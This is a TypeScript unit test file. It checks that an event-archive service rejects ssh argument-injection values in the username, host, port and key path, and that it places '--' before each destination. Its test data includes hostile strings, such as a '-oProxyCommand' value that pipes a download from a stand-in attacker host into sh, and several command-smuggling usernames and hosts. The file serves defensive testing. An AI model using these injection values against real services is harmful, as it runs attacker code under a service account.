/**
 * tests/unit/eventArchiveInjection.test.ts
 *
 * POST /events/archive-test handed an unvalidated body to ssh. A username of
 * `-oProxyCommand=<command>` is read by ssh as an option and runs the command
 * as the Polaris service account (scan finding F162). Host, username, port and
 * key path are now validated at save, at test, and before every export, and
 * every destination follows `--`.
 */

import { describe, it, expect, vi, beforeEach } from "vitest";
import { EventEmitter } from "node:events";

const { spawnMock, upsert } = vi.hoisted(() => ({
  spawnMock: vi.fn(),
  upsert: vi.fn(async () => ({})),
}));

vi.mock("node:child_process", () => ({ spawn: spawnMock }));
vi.mock("../../src/db.js", () => ({
  prisma: {
    setting: {
      findUnique: vi.fn(async () => null),
      upsert,
    },
    event: { findMany: vi.fn(async () => []) },
  },
}));

import {
  assertSafeArchiveSettings,
  testConnection,
  updateArchiveSettings,
  type ArchiveSettings,
} from "../../src/services/eventArchiveService.js";

const GOOD: ArchiveSettings = {
  enabled: true,
  protocol: "scp",
  host: "archive.example.com",
  port: 22,
  username: "polaris-archive",
  password: "",
  keyPath: "/etc/polaris/archive_key",
  remotePath: "/var/archive/polaris",
};

function fakeChild(exitCode = 0) {
  const child: any = new EventEmitter();
  child.stdout = new EventEmitter();
  child.stderr = new EventEmitter();
  child.stdin = { write: vi.fn(), end: vi.fn() };
  child.kill = vi.fn();
  setImmediate(() => child.emit("close", exitCode));
  return child;
}

beforeEach(() => {
  spawnMock.mockReset();
  spawnMock.mockImplementation(() => fakeChild(0));
  upsert.mockClear();
});

describe("assertSafeArchiveSettings", () => {
  it("accepts ordinary settings", () => {
    expect(() => assertSafeArchiveSettings(GOOD)).not.toThrow();
    expect(() => assertSafeArchiveSettings({ ...GOOD, host: "10.0.0.5" })).not.toThrow();
    expect(() => assertSafeArchiveSettings({ ...GOOD, host: "fd00::5" })).not.toThrow();
    expect(() => assertSafeArchiveSettings({ ...GOOD, host: "", username: "" })).not.toThrow();
  });

  it.each([
    "-oProxyCommand=curl http://attacker/s|sh",
    "-oProxyCommand=id",
    "-F/tmp/evil",
    "user name",
    "user\nname",
    "user;id",
    "user@host",
    "a".repeat(65),
  ])("refuses the username %j", (username) => {
    expect(() => assertSafeArchiveSettings({ ...GOOD, username })).toThrow(/username/);
  });

  it.each(["-oProxyCommand=id", "host name", "host;id", "host\nid", "-bad.example.com", "a..b/c"])(
    "refuses the host %j",
    (host) => {
      expect(() => assertSafeArchiveSettings({ ...GOOD, host })).toThrow(/host/);
    },
  );

  it.each([0, 65536, 22.5, -1, Number.NaN])("refuses the port %j", (port) => {
    expect(() => assertSafeArchiveSettings({ ...GOOD, port })).toThrow(/port/);
  });

  it("refuses a protocol that is neither sftp nor scp", () => {
    expect(() => assertSafeArchiveSettings({ ...GOOD, protocol: "ftp" as any })).toThrow(/protocol/);
  });

  it("refuses control characters in the remote path and a key path that looks like an option", () => {
    expect(() => assertSafeArchiveSettings({ ...GOOD, remotePath: "/a\nb" })).toThrow(/remotePath/);
    expect(() => assertSafeArchiveSettings({ ...GOOD, keyPath: "-oProxyCommand=id" })).toThrow(/keyPath/);
    expect(() => assertSafeArchiveSettings({ ...GOOD, keyPath: "/k\u0000ey" })).toThrow(/keyPath/);
  });
});

describe("testConnection", () => {
  it("never spawns a process for a hostile username", async () => {
    const res = await testConnection({ ...GOOD, username: "-oProxyCommand=curl http://attacker/s|sh" });
    expect(res.ok).toBe(false);
    expect(spawnMock).not.toHaveBeenCalled();
  });

  it("puts -- before the destination on ssh", async () => {
    await testConnection(GOOD);
    const [cmd, args] = spawnMock.mock.calls[0];
    expect(cmd).toBe("ssh");
    const i = args.indexOf("--");
    expect(i).toBeGreaterThan(-1);
    expect(args[i + 1]).toBe("polaris-archive@archive.example.com");
  });

  it("puts -- before the destination on sftp", async () => {
    await testConnection({ ...GOOD, protocol: "sftp" });
    const [cmd, args] = spawnMock.mock.calls[0];
    expect(cmd).toBe("sftp");
    const i = args.indexOf("--");
    expect(i).toBeGreaterThan(-1);
    expect(args[i + 1]).toBe("polaris-archive@archive.example.com");
  });
});

describe("updateArchiveSettings", () => {
  it("refuses a hostile username and stores nothing", async () => {
    await expect(updateArchiveSettings({ username: "-oProxyCommand=id" })).rejects.toMatchObject({ httpStatus: 400 });
    expect(upsert).not.toHaveBeenCalled();
  });

  it("stores valid settings", async () => {
    await updateArchiveSettings({ host: "archive.example.com", username: "polaris-archive" });
    expect(upsert).toHaveBeenCalledOnce();
  });
});
